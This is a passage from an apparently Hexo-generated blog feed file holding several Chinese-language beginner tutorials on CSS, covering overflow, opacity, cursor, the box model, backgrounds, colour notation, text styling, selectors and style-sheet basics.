id="3-2-语法"><a href="#3-2-语法" class="headerlink" title="3.2 语法"></a>3.2 语法</h3><p>overflow:属性值;</p><p><img src="/css/c29.png"></p><h3 id="3-3-例子"><a href="#3-3-例子" class="headerlink" title="3.3 例子"></a>3.3 例子</h3><p><img src="/css/c30.png"><br>运行结果:<br><img src="/css/c30yx.png"></p><h2 id="4-opacity属性"><a href="#4-opacity属性" class="headerlink" title="4. opacity属性"></a>4. opacity属性</h2><h3 id="4-1-定义"><a href="#4-1-定义" class="headerlink" title="4.1 定义"></a>4.1 定义</h3><p>opacity，规定不透明度，从 0.0（完全透明）到1.0（完全不透明）</p><h3 id="4-2-语法"><a href="#4-2-语法" class="headerlink" title="4.2 语法"></a>4.2 语法</h3><p>opacity: value| inherit;</p><p><img src="/css/c31.png"></p><h3 id="4-3-例子"><a href="#4-3-例子" class="headerlink" title="4.3 例子"></a>4.3 例子</h3><p><img src="/css/c32.png"><br>运行结果:<br><img src="/css/c32yx.png"></p><h2 id="5-cursor属性"><a href="#5-cursor属性" class="headerlink" title="5. cursor属性"></a>5. cursor属性</h2><h3 id="5-1-定义"><a href="#5-1-定义" class="headerlink" title="5.1 定义"></a>5.1 定义</h3><p>cursor属性定义了鼠标指针放在一个元素边界范围内时所用的光标的形状。</p><h3 id="5-2-语法"><a href="#5-2-语法" class="headerlink" title="5.2 语法"></a>5.2 语法</h3><p>cursor:url()*|{auto|default|pointer|crosshair|text|vertical-text|help|not-allowed|no-drop|move|e-reszie|s-resize|w-resize|w-resize|n-resize|all-scroll|ne-resize|se-resize|nw-resize|sw-resize|col-resize|row-resize|}</p><p>*表示至少写一个该值，url后面可再选{}内的一个值。</p><p><img src="/css/c33.png"></p><h3 id="5-3-例子"><a href="#5-3-例子" class="headerlink" title="5.3 例子"></a>5.3 例子</h3><p><img src="/css/c34.png"><br>运行结果:<br><img src="/css/c34yx.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> -css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第十五篇博客</title>
      <link href="/2021/01/10/di-shi-wu-pian-bo-ke/"/>
      <url>/2021/01/10/di-shi-wu-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="CSS-盒子模型"><a href="#CSS-盒子模型" class="headerlink" title="CSS 盒子模型"></a>CSS 盒子模型</h1><a id="more"></a><h2 id="1-定义"><a href="#1-定义" class="headerlink" title="1. 定义"></a>1. 定义</h2><p>1.盒子模型就是把HTML中的元素看作是一个矩形的盒子，也就是一个盛装内容的容器。</p><p>2.所有的文档元素(标签)都会生成一个矩形框，它描述了一个文档元素在网页布局汇总所占的位置大小。</p><p>3.每个盒子除了有自己的大小和位置外，还影响着其他盒子的大小和位置。</p><h2 id="2-组成"><a href="#2-组成" class="headerlink" title="2. 组成"></a>2. 组成</h2><p>每个矩形都是由内容(content)、内边距(padding)、边框(border)、外边距(margin)组成。</p><h2 id="3-盒子模型特性"><a href="#3-盒子模型特性" class="headerlink" title="3. 盒子模型特性"></a>3. 盒子模型特性</h2><p>1.每个盒子都有：边界、边框、填充、内容 4个属性；</p><p>2.每个属性都包括4个部分：上、右、下、左。属性的4部分可以同时设置，也可以分别设置。</p><p><img src="/css/hz.png"></p><h2 id="4-盒子边框-border"><a href="#4-盒子边框-border" class="headerlink" title="4. 盒子边框(border)"></a>4. 盒子边框(border)</h2><h3 id="4-1-定义"><a href="#4-1-定义" class="headerlink" title="4.1 定义"></a>4.1 定义</h3><p>border 属性来定义盒子的边框，该属性包含3个子属性：border-style(边框样式)，border-color(边框颜色)，border-width(边框宽度)。</p><h3 id="4-2-定义宽度"><a href="#4-2-定义宽度" class="headerlink" title="4.2 定义宽度"></a>4.2 定义宽度</h3><p>1.直接在属性后面指定宽度值。</p><p>border-bottom-width: 12px;      /* 定义底部边框宽度为12px*/</p><p>2.单独为某条边框设置宽度<br>单独为元素的某条变设置宽度，分别使用 border-top-width(顶部边框宽度)、border-bottom-width(底部边框宽度)、border-left-width(左边边框宽度)、border-right-width(右边边框宽度) 属性。</p><p>3.使用border-width属性快速定义边框宽度<br><img src="/css/bk.png"></p><h3 id="4-3-定义颜色"><a href="#4-3-定义颜色" class="headerlink" title="4.3 定义颜色"></a>4.3 定义颜色</h3><p>定义边框颜色可以使用颜色名、RGB 颜色值或十六进制颜色值。</p><p>border-top-color: #f00; /<em>为上边框定义颜色</em>/</p><h3 id="4-4-定义样式"><a href="#4-4-定义样式" class="headerlink" title="4.4 定义样式"></a>4.4 定义样式</h3><p>边框样式是边框显示的基础，CSS 提供了一下几种边框样式：</p><p><img src="/css/bk1.png"></p><h3 id="4-5-综合写法"><a href="#4-5-综合写法" class="headerlink" title="4.5 综合写法"></a>4.5 综合写法</h3><p>border : border-width(边框宽度) || border-style(边框样式) || border-color (边框颜色)</p><p>border 是一个复合属性，可以把3个子属性结合写在一起。注意：顺序不能错误。</p><h3 id="4-6-综合表"><a href="#4-6-综合表" class="headerlink" title="4.6 综合表"></a>4.6 综合表</h3><p><img src="/css/bk2.png"><br><img src="/css/bk3.png"></p><h2 id="5-内边距-padding"><a href="#5-内边距-padding" class="headerlink" title="5. 内边距(padding)"></a>5. 内边距(padding)</h2><h3 id="5-1-定义"><a href="#5-1-定义" class="headerlink" title="5.1 定义"></a>5.1 定义</h3><p>padding属性用于设置内边距,是指边框与内容之间的距离。</p><p><img src="/css/bk4.png"></p><h2 id="6-外边距-margin"><a href="#6-外边距-margin" class="headerlink" title="6. 外边距(margin)"></a>6. 外边距(margin)</h2><h3 id="6-1-定义"><a href="#6-1-定义" class="headerlink" title="6.1 定义"></a>6.1 定义</h3><p>margin属性用于设置外边距。 设置外边距会在元素之间创建“空白”，定义了元素与其他相邻元素的距离， 这段空白通常不能放置其他内容。</p><p>1.margin-top:上外边距</p><p>2.margin-right:右外边距</p><p>3.margin-bottom:下外边距</p><p>4.margin-left:上外边距</p><p>5.margin:上外边距 右外边距 下外边距 左外边</p><p>(取值顺序跟内边距相同。)</p><h3 id="6-2-拓展"><a href="#6-2-拓展" class="headerlink" title="6.2 拓展"></a>6.2 拓展</h3><p>1.拓展1:盒子水平居中</p><p><img src="/css/bk5.png"><br>2.拓展2:清除元素的默认内外边距</p><p><img src="/css/bk6.png"><br>3.拓展3:外边距合并<br>3.1 相邻块元素垂直外边距的合并(外边距垂直塌陷)</p><p><img src="/css/bk7.png"><br>3.2 嵌套块元素垂直外边距的合并</p><p><img src="/css/bk8.png"></p><h2 id="7-内容-content-宽度和高度（width-和-height）"><a href="#7-内容-content-宽度和高度（width-和-height）" class="headerlink" title="7. 内容(content)宽度和高度（width 和 height）"></a>7. 内容(content)宽度和高度（width 和 height）</h2><h3 id="7-1-定义"><a href="#7-1-定义" class="headerlink" title="7.1 定义"></a>7.1 定义</h3><p>1.使用宽度属性width和高度属性height可以对盒子的大小进行控制。<br>2.内容里面可以是文字或图片</p><p><img src="/css/bk9.png"></p><h2 id="8-盒子模型布局稳定性"><a href="#8-盒子模型布局稳定性" class="headerlink" title="8. 盒子模型布局稳定性"></a>8. 盒子模型布局稳定性</h2><p>根据稳定性来分，建议如下：</p><p>按照优先使用宽度(width)其次使用内边距(padding) 再次外边距(margin)。</p><p>width &gt;  padding  &gt;   margin</p><h2 id="9-盒子阴影"><a href="#9-盒子阴影" class="headerlink" title="9. 盒子阴影"></a>9. 盒子阴影</h2><p>语法格式：<br>box-shadow:水平阴影 垂直阴影 模糊距离 阴影尺寸 阴影颜色  内/外阴影；</p><p><img src="/css/bk10.png"></p><h2 id="10-css两种盒子模型"><a href="#10-css两种盒子模型" class="headerlink" title="10. css两种盒子模型"></a>10. css两种盒子模型</h2><p><img src="/css/hz1.png"></p><p><img src="/css/hz2.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> -css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第十四篇博客</title>
      <link href="/2021/01/09/di-shi-si-pian-bo-ke/"/>
      <url>/2021/01/09/di-shi-si-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="CSS-背景样式"><a href="#CSS-背景样式" class="headerlink" title="CSS 背景样式"></a>CSS 背景样式</h1><a id="more"></a><h2 id="1-定义"><a href="#1-定义" class="headerlink" title="1. 定义"></a>1. 定义</h2><p>css背景样式主要包括背景颜色和背景图像。</p><h2 id="2-背景颜色"><a href="#2-背景颜色" class="headerlink" title="2. 背景颜色"></a>2. 背景颜色</h2><h3 id="2-1-定义"><a href="#2-1-定义" class="headerlink" title="2.1 定义"></a>2.1 定义</h3><p>背景颜色(background-color),使用background-color属性来定义元素的背景颜色。</p><h3 id="2-2语法"><a href="#2-2语法" class="headerlink" title="2.2语法"></a>2.2语法</h3><p>background-color:颜色值;</p><p><img src="/css/bj.png"><br>运行结果:<br><img src="/css/c18yx.png"></p><h2 id="3-背景图像"><a href="#3-背景图像" class="headerlink" title="3. 背景图像"></a>3. 背景图像</h2><h3 id="3-1-背景图像样式-background-image"><a href="#3-1-背景图像样式-background-image" class="headerlink" title="3.1 背景图像样式(background-image)"></a>3.1 背景图像样式(background-image)</h3><p>1.定义<br>在css中,使用background-image属性定义元素的背景图片。</p><p>2.语法<br>background-image:url(“图像地址”);</p><p><img src="/css/c19.png"><br>运行结果:<br><img src="/css/c19yx.png"></p><h3 id="3-2-背景重复样式-background-repeat"><a href="#3-2-背景重复样式-background-repeat" class="headerlink" title="3.2 背景重复样式(background-repeat)"></a>3.2 背景重复样式(background-repeat)</h3><p>1.定义<br>在css中，使用background-repeat属性定义背景图像的平铺方式。</p><p>2.语法<br>background-repeat:取值;</p><p>3.属性值<br>1.background-repeat:no-repeat; 表示不平铺</p><p>2.background-repeat:repeat; 默认值，表示在水平方向(x轴)和垂直方向(y轴)同时平铺</p><p>3.background-repeat:repeat-x; 表示在水平方向(x轴)平铺</p><p>4.background-repeat:repeat-y; 表示在垂直方向(y轴)平铺</p><p><img src="/css/c20.png"><br>运行结果:<br><img src="/css/c20yx.png"></p><h3 id="3-3-背景图像位置-background-position"><a href="#3-3-背景图像位置-background-position" class="headerlink" title="3.3 背景图像位置(background-position)"></a>3.3 背景图像位置(background-position)</h3><p>1.定义<br>1.background-position属性定义了背景图像的位置。</p><p>2.background-position属性只能应用于块级元素和替换元素。<br>其中替换元素包括(img、input、textarea、select、object’)</p><p>替换元素:替换元素是浏览器根据其标签的元素与属性来判断显示具体的内容。<br>2.语法<br>background-position:像素值/关键字;</p><p>2.1 background-position取值为像素值<br>1.定义<br>background-position取值为像素值时，要设置水平方向数值(x轴)和垂直方向数值(y轴)。</p><p>2.语法<br>background-position:x y;<br>x(数值) 设置网页的横向位置,单位为px<br>y(数值) 设置网页的纵向位置,单位为px</p><p><img src="/css/c21.png"><br>运行结果:<br><img src="/css/c21yx.png"></p><p>2.2 background-position取值为关键字<br>1.background-position:top left;       表示左上<br>2.background-position:top center;     表示靠上居中<br>3.background-position:top right;      表示右上<br>4.background-position:left center;    表示靠左居中<br>5.background-position:center center;  表示正中<br>6.background-position:right center;   表示靠右居中<br>7.background-position:bottom left;    表示左下<br>8.background-position:bottom center;  表示靠左居中<br>9.background-position:bottom right;   表示右下</p><p><img src="/css/c22.png"><br>运行结果:<br><img src="/css/c22yx.png"></p><h3 id="3-4-背景固定样式-background-attachment"><a href="#3-4-背景固定样式-background-attachment" class="headerlink" title="3.4 背景固定样式(background-attachment)"></a>3.4 背景固定样式(background-attachment)</h3><p>1.定义<br>background-attachment属性来定义背景图像是随对象滚动还是固定不动。</p><p>2.语法<br>background-attachment:scroll/fixed;</p><p>scroll 表示随对象滚动，默认选项。</p><p>fixed 表示背景图像固定在页面不动。</p><p><img src="/css/c23.png"><br>运行结果:<br><img src="/css/c23yx.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> -css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第十三篇博客</title>
      <link href="/2021/01/09/di-shi-san-pian-bo-ke/"/>
      <url>/2021/01/09/di-shi-san-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="CSS-颜色的表示方式"><a href="#CSS-颜色的表示方式" class="headerlink" title="CSS 颜色的表示方式"></a>CSS 颜色的表示方式</h1><a id="more"></a><h2 id="1-英文单词表示颜色"><a href="#1-英文单词表示颜色" class="headerlink" title="1.英文单词表示颜色"></a>1.英文单词表示颜色</h2><h3 id="1-1-定义"><a href="#1-1-定义" class="headerlink" title="1.1 定义"></a>1.1 定义</h3><p>直接用颜色的英文单词表示，例如：blue（蓝色），red（红的）。</p><h3 id="1-2-语法"><a href="#1-2-语法" class="headerlink" title="1.2 语法"></a>1.2 语法</h3><p>color:颜色值(英文单词);<br><img src="/css/ys.png"></p><h2 id="1-3-缺点"><a href="#1-3-缺点" class="headerlink" title="1.3 缺点"></a>1.3 缺点</h2><p>颜色有成千上万种，不是每种颜色都有对应的英文单词，使用上会有局限性。</p><h2 id="2-十六进制表示颜色"><a href="#2-十六进制表示颜色" class="headerlink" title="2. 十六进制表示颜色"></a>2. 十六进制表示颜色</h2><p>十六进制颜色的组成部分是：＃RRGGBB，其中RR（红色），GG（绿色）和BB（蓝色），所有值都必须介于0和FF之间。通俗来讲，十六进制的实质就是rgb，每两位表示一个颜色。当每两位的值一样的时候可以缩写，比如color：#ffcc00可以简写成color：#fc0。</p><p>color:#ffcc00;</p><h2 id="3-RGB表示颜色"><a href="#3-RGB表示颜色" class="headerlink" title="3. RGB表示颜色"></a>3. RGB表示颜色</h2><p>　　RGB中，R表示red红色，G表示green绿色，B表示blue蓝色。(哪个数值越大，哪个原色的比重就会加大)</p><h3 id="3-1-数值表示"><a href="#3-1-数值表示" class="headerlink" title="3.1 数值表示"></a>3.1 数值表示</h3><p>RGB写法：rgb（0,0,0）。它的取值范围都在0-255之间，值越大越颜色越深。</p><p>color: rgb(255, 255, 255);</p><p>常见颜色的RGB表示方法。红色：rgb(255,0,0)；白色：rgb(255,255,255)；黑色：rgb(0,0,0)</p><h3 id="3-2-百分比表示"><a href="#3-2-百分比表示" class="headerlink" title="3.2 百分比表示"></a>3.2 百分比表示</h3><p>RGB除了可以用数值以外，它还可以用百分百，取值在0%到100%之间。比如：RGB（0,0,255）和RGB（0％，0％，100％）表示的是同一种颜色。</p><p>color: rgb(10%, 20%, 80%);</p><h2 id="4-HSL表示颜色"><a href="#4-HSL表示颜色" class="headerlink" title="4.HSL表示颜色"></a>4.HSL表示颜色</h2><p>HSL颜色值分别代表：色相，饱和度，亮度。</p><p>1.色相:色相是在色轮上的程度（从0到360）0（或360）是红色的，120是绿色的，240是蓝色的。</p><p>2.饱和度:饱和度是一个百分比值，0％意味着灰色和100％的阴影，是全彩。</p><p>3.亮度:是一个百分比，0％是黑色的，100％是白色的。</p><h2 id="5-例子"><a href="#5-例子" class="headerlink" title="5.例子"></a>5.例子</h2><p><img src="/css/c18.png"><br>运行结果:<br><img src="/css/c18yx.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> -css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第十二篇博客</title>
      <link href="/2021/01/08/di-shi-er-pian-bo-ke/"/>
      <url>/2021/01/08/di-shi-er-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="CSS-文本样式"><a href="#CSS-文本样式" class="headerlink" title="CSS 文本样式"></a>CSS 文本样式</h1><a id="more"></a><h2 id="1-下划线、删除线和顶划线-text-decoration"><a href="#1-下划线、删除线和顶划线-text-decoration" class="headerlink" title="1. 下划线、删除线和顶划线(text-decoration)"></a>1. 下划线、删除线和顶划线(text-decoration)</h2><p>1.定义<br>用text-decoration定义文本的下划线、删除线和顶划线。</p><p>2.语法<br>text-decoration:属性值;<br>1.text-decoration:none; 默认值，可以用此属性去掉有下划线、删除线和顶划线样式的。</p><p>2.text-decoration:underline; 下划线</p><p>3.text-decoration:line-through; 删除线</p><p>4.text-decoration:overline; 顶划线</p><p><img src="/css/c10.png"><br>运行结果:<br><img src="/css/c10yx.png"></p><h2 id="2-文本大小写-text-transform"><a href="#2-文本大小写-text-transform" class="headerlink" title="2. 文本大小写(text-transform)"></a>2. 文本大小写(text-transform)</h2><p>1.定义<br>text-transform属性来转换文本的大小写，针对英文而言。</p><p>2.语法<br>text-transform:属性值;<br>1.text-transform:none; 默认值，无转换发生。</p><p>2.text-transform:uppercase; 转换成大写。</p><p>3.text-transform:lowercase; 转换成小写。</p><p>4.text-transform:capitalize; 首字母转换成大写，其余不发生变动。</p><p><img src="/css/c11.png"><br>运行结果:<br><img src="/css/c11yx.png"></p><h2 id="3-小型大写字母-font-variant"><a href="#3-小型大写字母-font-variant" class="headerlink" title="3. 小型大写字母(font-variant)"></a>3. 小型大写字母(font-variant)</h2><p>1.定义<br>使用font-variant属性把文本设置成小型大写字母，针对英文而言。</p><p>2.语法<br>font-variant:normal/small-caps;<br>1.font-variant:normal: 默认值，正常效果</p><p>2.font-variant:small-caps; 小型大写字母的字体</p><p><img src="/css/c12.png"><br>运行结果:<br><img src="/css/c12yx.png"></p><h2 id="4-首行缩进-text-indent"><a href="#4-首行缩进-text-indent" class="headerlink" title="4. 首行缩进(text-indent)"></a>4. 首行缩进(text-indent)</h2><p>1.定义<br>使用text-indent属性来定义段落首行缩进。</p><p>2.语法<br>text-indent:像素值;</p><p><img src="/css/c13.png"><br>运行结果:<br><img src="/css/c13yx.png"></p><h2 id="5-文本水平对齐-text-align"><a href="#5-文本水平对齐-text-align" class="headerlink" title="5. 文本水平对齐(text-align)"></a>5. 文本水平对齐(text-align)</h2><p>1.定义<br>使用text-align属性控制文本的水平方向的对齐方式:左对齐、居中对齐、右对齐。(只针对文本文字和img标签，对其他标签无效)</p><p>2.语法<br>text-align:属性值;<br>1.text-align:left; 默认值，左对齐</p><p>2.text-align:center; 居中对齐</p><p>3.text-align:right; 右对齐</p><p><img src="/css/c14.png"><br>运行结果:<br><img src="/css/c14yx.png"></p><h2 id="6-行高-line-height"><a href="#6-行高-line-height" class="headerlink" title="6. 行高(line-height)"></a>6. 行高(line-height)</h2><p>1.定义<br>行高，指的就是一行的高度。</p><p>2.语法<br>line-height:像素值;</p><p><img src="/css/c15.png"><br>运行结果:<br><img src="/css/c15yx.png"></p><h2 id="7-字母间距和词间距"><a href="#7-字母间距和词间距" class="headerlink" title="7.字母间距和词间距"></a>7.字母间距和词间距</h2><h3 id="7-1-字母间距-letter-spacing"><a href="#7-1-字母间距-letter-spacing" class="headerlink" title="7.1 字母间距(letter-spacing)"></a>7.1 字母间距(letter-spacing)</h3><p>1.定义<br>letter-spacing属性定义字间距。</p><p>2.语法<br>letter-spacing:像素值;</p><p><img src="/css/c16.png"><br>运行结果:<br><img src="/css/c16yx.png"></p><h3 id="7-2-词间距-word-spacing"><a href="#7-2-词间距-word-spacing" class="headerlink" title="7.2 词间距(word-spacing)"></a>7.2 词间距(word-spacing)</h3><p>1.定义<br>word-spacing属性定义单词之间的距离。(定义词间距，以空格为基准进行调节)</p><p>2.语法<br>word-spacing:属性值;</p><p><img src="/css/c17.png"><br>运行结果:<br><img src="/css/c17yx.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> -css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第十一篇博客</title>
      <link href="/2021/01/08/di-shi-yi-pian-bo-ke/"/>
      <url>/2021/01/08/di-shi-yi-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="CSS选择器"><a href="#CSS选择器" class="headerlink" title="CSS选择器"></a>CSS选择器</h1><a id="more"></a><h2 id="1-css选择器格式"><a href="#1-css选择器格式" class="headerlink" title="1.css选择器格式"></a>1.css选择器格式</h2><p>选择器</p><p>{<br>     样式属性1:取值1;<br>     样式属性2:取值2;<br>}</p><h2 id="2-选择器分类"><a href="#2-选择器分类" class="headerlink" title="2.选择器分类"></a>2.选择器分类</h2><h3 id="2-1-元素选择器-标签"><a href="#2-1-元素选择器-标签" class="headerlink" title="2.1 元素选择器(标签)"></a>2.1 元素选择器(标签)</h3><p>1.定义<br>1.最常见的 CSS 选择器是元素选择器。换句话说，文档的元素就是最基本的选择器。</p><p>2.如果设置 HTML 的样式，选择器通常将是某个 HTML 元素，比如 p、h1、em、a，甚至可以是 html 本身。</p><p>2.例子<br><img src="/css/c6.png"><br>运行结果:<br><img src="/css/c6yx.png"></p><h3 id="2-2-派生选择器"><a href="#2-2-派生选择器" class="headerlink" title="2.2 派生选择器"></a>2.2 派生选择器</h3><p>1.定义<br>1.通过依据元素在其位置的上下文关系来定义样式，可以使代码更加整洁。</p><p>2.例子<br><img src="/css/c7.png"><br>运行结果:<br><img src="/css/c7yx.png"></p><h3 id="2-3-id选择器"><a href="#2-3-id选择器" class="headerlink" title="2.3 id选择器"></a>2.3 id选择器</h3><p>1.定义<br>id选择器可以为标有特定id的HTML元素指定特定的样式，id选择器以”#”来定义。</p><p>2.例子<br><img src="/css/c8.png"><br>运行结果:<br><img src="/css/c8yx.png"></p><h3 id="2-4-class-类-选择器"><a href="#2-4-class-类-选择器" class="headerlink" title="2.4 class(类)选择器"></a>2.4 class(类)选择器</h3><p>1.定义<br>1.类选择器允许一种独立于文档元素的方式来指定样式。<br>2.该选择器可以单独使用，也可以结合使用。</p><p>2.分类<br>1.单独类选择器<br><img src="/css/c9.png"><br>运行结果:<br><img src="/css/c91.png"></p><p><img src="/css/c92.png"><br>运行结果:<br><img src="/css/c93.png"></p><p>2.结合元素选择器(类选择器可以结合元素选择器来使用)<br><img src="/css/c94.png"><br>运行结果:<br><img src="/css/c95.png"></p><p>3.css多类选择器<br>在 HTML 中，一个 class 值中可能包含一个词列表，各个词之间用空格分隔。</p><p><img src="/css/c96.png"><br>运行结果:<br><img src="/css/c97.png"></p><h3 id="2-5-后代选择器-使用空格表示后代选择器-父元素的后代-包括儿子-孙子-重孙子"><a href="#2-5-后代选择器-使用空格表示后代选择器-父元素的后代-包括儿子-孙子-重孙子" class="headerlink" title="2.5 后代选择器(使用空格表示后代选择器.(父元素的后代(包括儿子,孙子,重孙子))"></a>2.5 后代选择器(使用空格表示后代选择器.(父元素的后代(包括儿子,孙子,重孙子))</h3><p>1.定义<br>1.后代选择器又称为包含选择器。</p><p>2.后代选择器比子选择器的范围大，包含子选择器，且包含子选择器的“子孙”选择器，后代选择器使用”空格”符号间隔选择器。</p><p>2.语法<br>选择器1 选择器2 选择器3{}  (选择器之间用空格隔开)</p><p><img src="/css/c98.png"><br>运行结果:<br><img src="/css/c99.png"></p><p><img src="/css/c903.png"></p><h3 id="2-6-子代选择器-使用-gt-表示子代选择器。仅仅只选择子代-不包含孙子…"><a href="#2-6-子代选择器-使用-gt-表示子代选择器。仅仅只选择子代-不包含孙子…" class="headerlink" title="2.6 子代选择器(使用&gt;表示子代选择器。仅仅只选择子代(不包含孙子…)"></a>2.6 子代选择器(使用&gt;表示子代选择器。仅仅只选择子代(不包含孙子…)</h3><p>1.定义<br>只能选择作为某元素子元素的元素。</p><p>2.语法<br>选择器1 &gt; 选择器2{}</p><p><img src="/css/c901.png"><br>运行结果:<br><img src="/css/c902.png"></p><p><img src="/css/c904.png"></p><h3 id="2-7-通配符选择器-“-”指的是通配符"><a href="#2-7-通配符选择器-“-”指的是通配符" class="headerlink" title="2.7 通配符选择器(“*”指的是通配符)"></a>2.7 通配符选择器(“*”指的是通配符)</h3><p>1.定义<br> 1.(*)选择器选取所有元素。</p><p><img src="/css/c905.png"><br>运行结果:<br><img src="/css/c906.png"></p><p>2.(*)选择器也能选取另一个元素中的所有元素.</p><p><img src="/css/c907.png"><br>运行结果:<br><img src="/css/c908.png"></p><h3 id="2-8组合选择器"><a href="#2-8组合选择器" class="headerlink" title="2.8组合选择器"></a>2.8组合选择器</h3><p>在css文件中，组合选择器可以是id选择器，类选择器，html标签选择器等。</p><p><img src="/css/c909.png"><br>运行结果:<br><img src="/css/c910.png"></p><h3 id="2-9-相邻选择器"><a href="#2-9-相邻选择器" class="headerlink" title="2.9 相邻选择器"></a>2.9 相邻选择器</h3><p>1.定义<br>只选择其兄弟类，所以也叫兄弟选择器。</p><p>2.方法<br>方式1：类名1 + 类名2{ }    只能选中类名2</p><p><img src="/css/c911.png"><br>运行结果:<br><img src="/css/c912.png"></p><p>方式2：类名1 ~ div {  }  除了类名1不会选中，他所有兄弟类都会被选中。</p><p><img src="/css/c913.png"><br>运行结果:<br><img src="/css/c914.png"></p><h3 id="2-10-群组选择器"><a href="#2-10-群组选择器" class="headerlink" title="2.10 群组选择器"></a>2.10 群组选择器</h3><p>1.定义<br>同时对几个选择器进行相同的操作。</p><p><img src="/css/c915.png"><br>运行结果:<br><img src="/css/c916.png"></p><h2 id="3-选择器优先级"><a href="#3-选择器优先级" class="headerlink" title="3.选择器优先级"></a>3.选择器优先级</h2><p>important&gt;内联&gt;id&gt;class = 属性 = 伪类 &gt;标签 = 伪元素 &gt; 通配符（*）</p><h2 id="4-伪类-a标签的4种状态"><a href="#4-伪类-a标签的4种状态" class="headerlink" title="4.伪类(a标签的4种状态)"></a>4.伪类(a标签的4种状态)</h2><p>1.定义a元素未访问时的样式</p><p>a:link{css样式}</p><p>2.定义a元素访问后的样式</p><p>a:visited{css样式}</p><p>3.定义鼠标经过显示的样式</p><p>a:hover{css样式}</p><p>4.定义鼠标单击激活时的样式</p><p>a:active{css样式}</p><p><img src="/css/c917.png"><br>运行结果:<br><img src="/css/c918.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> -css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第十篇博客</title>
      <link href="/2021/01/07/di-shi-pian-bo-ke/"/>
      <url>/2021/01/07/di-shi-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="CSS基本知识"><a href="#CSS基本知识" class="headerlink" title="CSS基本知识"></a>CSS基本知识</h1><a id="more"></a><h2 id="1-定义"><a href="#1-定义" class="headerlink" title="1.定义"></a>1.定义</h2><p>1.css是指层叠样式表，控制网页外观。</p><p>2.样式定义如何显示 HTML 元素。</p><p>3.样式通常存储在样式表中。</p><p>4.把样式添加到 HTML 4.0 中，是为了解决内容与表现分离的问题。</p><p>5.外部样式表可以极大提高工作效率，外部样式表通常存储在 CSS 文件中，多个样式定义可层叠为一个。</p><h2 id="2-引入方式"><a href="#2-引入方式" class="headerlink" title="2.引入方式"></a>2.引入方式</h2><h3 id="2-1内联样式表"><a href="#2-1内联样式表" class="headerlink" title="2.1内联样式表"></a>2.1内联样式表</h3><p>1.定义<br>使用标签的style属性引入css样式。</p><p><img src="/css/c1.png"><br>运行结果:<br><img src="/css/c1yx.png"></p><h3 id="2-2内部样式表"><a href="#2-2内部样式表" class="headerlink" title="2.2内部样式表"></a>2.2内部样式表</h3><p>1.定义<br>在style标签中书写CSS代码。style标签写在head标签中。</p><p><img src="/css/c2.png"><br>运行结果:<br><img src="/css/c2yx.png"></p><h3 id="2-3外部样式表"><a href="#2-3外部样式表" class="headerlink" title="2.3外部样式表"></a>2.3外部样式表</h3><h4 id="2-3-1链接式"><a href="#2-3-1链接式" class="headerlink" title="2.3.1链接式"></a>2.3.1链接式</h4><p>1.定义<br>CSS代码保存在扩展名为.css的样式表中。HTML文件引用扩展名为.css的样式表。</p><p>2.语法<br>&lt; link type=”text/css” rel=”styleSheet”  href=”CSS文件路径” /&gt;</p><p><img src="/css/c3.png"><br>css样式<br><img src="/css/c3ys.png"><br>运行结果:<br><img src="/css/c2yx.png"></p><h4 id="2-3-2导入式"><a href="#2-3-2导入式" class="headerlink" title="2.3.2导入式"></a>2.3.2导入式</h4><p>1.定义<br>CSS代码保存在扩展名为.css的样式表中。HTML文件引用扩展名为.css的样式表。</p><p>2.语法<br>&lt; style type=”text/css”&gt;<br>  @import url(“css文件路径”);<br>&lt; /style&gt;</p><p><img src="/css/c4.png"><br>css样式<br><img src="/css/c3ys.png"><br>运行结果:<br><img src="/css/c2yx.png"></p><h4 id="2-4权重"><a href="#2-4权重" class="headerlink" title="2.4权重"></a>2.4权重</h4><p>1.内联样式权重最大，内部样式和外部样式权重值相等，采用哪个取决于代码书写顺序，后写覆盖先写。</p><p>2.先写的样式表有后写样式表中没有的样式，此则没有的样式会继续保留不会被覆盖</p><h2 id="3-css继承性"><a href="#3-css继承性" class="headerlink" title="3.css继承性"></a>3.css继承性</h2><p>1.定义<br>定义：继承就是给父及设置了一些属性，子级继承了父及的该属性。</p><p>1.color,font-,text-,line-*(这些可以继承)</p><p>2.a标签的文字颜色和下划线是不能继承的</p><p>3.h标签的文字大小是不能继承的</p><p>4.像一些盒子元素，定位元素（浮动，绝对，固定定位）不能继承</p><p><img src="/css/c5.png"><br>运行结果:<br><img src="/css/c5yx.png"><br>子级继承了字体颜色，边框不能继承</p><h2 id="4-css层叠"><a href="#4-css层叠" class="headerlink" title="4.css层叠"></a>4.css层叠</h2><p>1.定义<br>1.层叠性只有在多个选择器选中”同一个标签”, 然后又设置了”相同的属性”, 才会发生层叠性。</p><p>2.层叠性由优先级决定，间接选中就是指继承。</p><p>3.都是直接选中时，并且是同类型的选择器时，谁写在后面就听谁的。</p><p>2.优先级<br>!important &gt; 行内样式&gt;ID选择器 &gt; 类选择器 &gt; 标签 &gt; 通配符 &gt; 继承 &gt; 浏览器默认属性</p><p>3.不冲突时，多个样式可层叠为一个。</p><p><img src="/css/cd1.png"></p><p>4.冲突时，按不同样式规则优先级来应用样式。<br><img src="/css/cd2.png"><br><img src="/css/cd3.png"><br><img src="/css/cd4.png"><br><img src="/css/cd5.png"><br><img src="/css/cd6.png"><br><img src="/css/cd7.png"><br><img src="/css/cd8.png"><br><img src="/css/cd9.png"><br><img src="/css/cd10.png"><br><img 